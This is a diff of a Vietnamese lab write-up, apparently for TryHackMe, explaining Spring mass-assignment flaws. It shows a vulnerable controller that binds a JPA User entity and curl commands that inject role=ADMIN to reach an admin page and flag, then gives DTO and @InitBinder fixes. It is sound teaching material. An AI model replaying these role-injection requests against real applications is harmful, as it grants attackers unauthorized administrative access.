@@ -105,11 +105,101 @@ JdbcTemplate là một công cụ mạnh mẽ được tích hợp sẵn trong c
 
 # Phân bổ khối lượng và liên kết mô hình
 
-Bộ liên kết dữ liệu của Spring chuyển đổi các tham số yêu cầu thành một đối tượng Java. Một phương thức của bộ điều khiển khai báo một kiểu tham số được chú thích là `@ParameterType` `@ModelAttribute`, và bộ liên kết sẽ khớp các trường biểu mẫu đến, giá trị truy vấn và dữ liệu đường dẫn với các thuộc tính của kiểu đó theo tên. Điều này rất tiện lợi và tự động. Vấn đề là "theo tên" có nghĩa là "mọi thuộc tính theo tên", bao gồm cả những thuộc tính mà biểu mẫu chưa bao giờ hiển thị. Kết quả là việc gán hàng loạt, thuật ngữ mà Spring dùng để chỉ việc ghi đè dữ liệu: kẻ tấn công gửi thêm một trường và bộ liên kết vẫn thiết lập trường đó.
+Bộ liên kết dữ liệu của Spring chuyển đổi các tham số yêu cầu thành một đối tượng Java. Một phương thức của bộ điều khiển khai báo một kiểu tham số được chú thích là `@ModelAttribute`, và bộ liên kết sẽ khớp các trường biểu mẫu đến, giá trị truy vấn và dữ liệu đường dẫn với các thuộc tính của kiểu đó theo tên. Điều này rất tiện lợi và tự động. Vấn đề là "theo tên" có nghĩa là "mọi thuộc tính theo tên", bao gồm cả những thuộc tính mà biểu mẫu chưa bao giờ hiển thị. Kết quả là việc gán hàng loạt, thuật ngữ mà Spring dùng để chỉ việc ghi đè dữ liệu: kẻ tấn công gửi thêm một trường và bộ liên kết vẫn thiết lập trường đó.
 
 Trình ràng buộc không quan tâm giá trị đến từ đâu. Các trường biểu mẫu, tham số chuỗi truy vấn và biến đường dẫn đều được đưa vào cùng một bước khớp, vì vậy kẻ tấn công có thể đưa một thuộc tính vào thông qua bất kỳ kênh nào mà hành động chấp nhận. Nó cũng không quan tâm liệu giao diện người dùng có hiển thị trường đó hay không. Biểu mẫu được hiển thị chỉ là HTML; hợp đồng ràng buộc là kiểu tham số, chứ không phải trang. Đây là lý do tại sao việc gán hàng loạt xuất hiện lặp đi lặp lại trong mã ràng buộc các thực thể JPA trực tiếp từ yêu cầu, mặc định tiện lợi lại là mặc định không an toàn.
 
-## Nhận diện nó ngay trong nguồn gốc
+Hãy tưởng tượng bạn đưa cho shipper một tờ giấy ghi chú bảo: "Hãy sửa giúp tôi Tên và Số điện thoại trong hồ sơ". Nhưng shipper lại tự ý lấy cả quyển sổ thông tin gốc của bạn ra, thấy trên đó có ô "Chức vụ" và "Số dư tài khoản", anh ta liền tự điền thêm vào rồi lưu lại. Cơ chế mặc định của Spring cũng đang hoạt động "ngây thơ" như vậy.
+
+🔴 Lỗi này xảy ra như thế nào?
+1. Lập trình viên dùng chung một "mẫu thiết kế" cho cả cơ sở dữ liệu và dữ liệu nhận từ người dùng (gọi là JPA Entity).
+2. Spring tự động điền dữ liệu theo tên: Khi có yêu cầu gửi lên, Spring cứ thấy tên trường nào trùng nhau (ví dụ: name, email, role) là nó tự động nhét giá trị vào đối tượng Java, bất kể trường đó có được hiển thị trên màn hình trang web hay không.
+
+⚠️ Kẻ xấu lợi dụng ra sao?
+Trên giao diện web chỉ hiện 2 ô nhập: Họ tên và Số điện thoại. Tuy nhiên, kẻ tấn công cố tình "chế" thêm một ô nhập ẩn hoặc gửi thêm một tham số có tên là role=ADMIN hoặc balance=999999.
+Vì Spring xử lý tự động theo tên, nó sẽ ghi đè luôn cả quyền ADMIN hoặc số tiền đó vào tài khoản của kẻ xấu.
+
+## Nhận diện nó ngay trong mã nguồn 
+
+Mở `User.java`trong trình xem:
+
+```
+@Entity
+@Table(name = "users")
+public class User {
+    private Long id;
+    private String username;
+    private String password;
+    private String email;
+    private String role = "USER";
+    // getters and setters
+}
+```
+Trường `role` chính là điều đáng chú ý. Giờ hãy mở `AccountController.java`và đọc hướng dẫn cập nhật hồ sơ:
+```
+@PostMapping("/account/update")
+public String update(@ModelAttribute User user, HttpSession session) {
+    ...
+    users.save(user);
+    return "redirect:/account/profile";
+}
+```
+
+Thao tác này liên kết toàn bộ`User`thực thể trực tiếp từ yêu cầu và lưu lại. Biểu mẫu hồ sơ chỉ hiển thị một `email`trường, nhưng việc liên kết diễn ra trên toàn bộ lớp. Nếu chúng ta thêm `role=ADMIN`vào phần thân POST, trình liên kết sẽ thiết lập nó và thao tác lưu sẽ lưu giữ nó. Giải pháp mà người đánh giá đề xuất là liên kết một Đối tượng Truyền Dữ liệu (Data Transfer Object) không có roletrường nào, hoặc hạn chế trình liên kết bằng một `@InitBinder`phương thức gọi `setAllowedFields("email")`. Việc liên kết các loại thực thể trực tiếp từ yêu cầu là nguyên nhân gốc rễ; cả hai giải pháp đều giữ trường nhạy cảm tránh xa trình liên kết.
+
+## Khai thác ứng dụng Live
+
+Đăng ký và đăng nhập (phòng thí nghiệm sẽ lưu giữ cookie phiên; không cần thao tác phức tạp với token), sau đó gửi bản cập nhật hồ sơ với trường bổ sung. Chúng tôi sử dụng cookie jar để đảm bảo phiên được duy trì giữa các yêu cầu:
+
+```
+root@TryHackMe:~# curl -s -c cj -b cj -d "username=rev&password=pw&email=x@x.com" http://10.112.147.8:8080/account/register -o /dev/null
+root@TryHackMe:~# curl -s -c cj -b cj -d "username=rev&password=pw" http://10.112.147.8:8080/account/login -o /dev/null
+root@TryHackMe:~# curl -s -c cj -b cj -d "email=rev@x.com&role=ADMIN" http://10.112.147.8:8080/account/update -o /dev/null
+root@TryHackMe:~# curl -s -c cj -b cj http://10.112.147.8:8080/admin | grep -o 'THM{[^}]*}'
+THM{...}
+```
+
+Vai trò được đọc từ bản ghi trong cơ sở dữ liệu, vì vậy `/admin`trang sẽ trả về bảng điều khiển sau khi `ADMIN`giá trị được ghi đè đã được lưu lại. Trong một bài kiểm tra dựa trên trình duyệt, bạn sẽ làm điều tương tự trong Burp: bắt lấy yêu cầu POST hồ sơ, thêm thông tin `role=ADMIN`và phát lại trước khi tải lại trang `/admin`.
+
+Người đánh giá nên có khả năng viết cả hai bản sửa lỗi từ trí nhớ, bởi vì chúng là cùng một bản sửa lỗi được áp dụng theo hai cách: giữ trường dữ liệu nhạy cảm tránh xa trình quản lý tập tin. Một đối tượng truyền dữ liệu (Data Transfer Object - DTO) chỉ hiển thị những gì người dùng có thể thay đổi:
+
+```
+public class ProfileUpdateDto { private String email; /* no role */ }
+public String update(@ModelAttribute ProfileUpdateDto dto, ...) { ... }
+```
+Với DTO, `role`thuộc tính đó không tồn tại trên kiểu dữ liệu được liên kết, vì vậy kẻ tấn công không thể thiết lập gì và nhà phát triển tương lai cũng không thể quên điều đó. Cách tiếp cận nhẹ nhàng hơn là ràng buộc trình liên kết tại chỗ:
+
+```
+@InitBinder
+public void initBinder(WebDataBinder binder) { binder.setAllowedFields("email"); }
+```
+Điều này báo cho Spring chỉ điền dữ liệu `email`và âm thầm loại bỏ bất kỳ tham số yêu cầu nào khác. Việc liên kết trực tiếp các kiểu thực thể từ yêu cầu là nguyên nhân gốc rễ, và việc xem xét mã sẽ chỉ ra mọi `@ModelAttribute SomeEntity`trường hợp thiếu một trong những điều kiện kiểm tra này. Rủi ro tương tự cũng áp dụng cho `@RequestBodytrên` một JSON điểm cuối (endpoint) giải mã dữ liệu thành một thực thể, vì vậy quy tắc được khái quát hóa: hãy liên kết một kiểu dữ liệu đầu vào được thiết kế riêng, chứ không phải kiểu dữ liệu persistence model của bạn.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
